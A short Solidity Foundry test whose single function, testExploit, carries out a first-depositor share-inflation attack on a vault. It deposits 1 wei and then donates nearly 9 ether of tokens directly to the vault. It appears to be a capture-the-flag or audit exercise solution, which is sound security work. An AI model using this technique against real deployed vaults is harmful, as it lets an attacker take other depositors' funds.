// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import {Test, console2} from "forge-std/Test.sol";

import {VaultBaseTest} from "./VaultBase.t.sol";

contract VaultTest is VaultBaseTest {
    function testExploit() public validation {
        token.approve(address(vault), 9 ether);
        vault.deposit(1 wei, user);
        
        token.transfer(address(vault), 9 ether - 1 wei);
    }
}
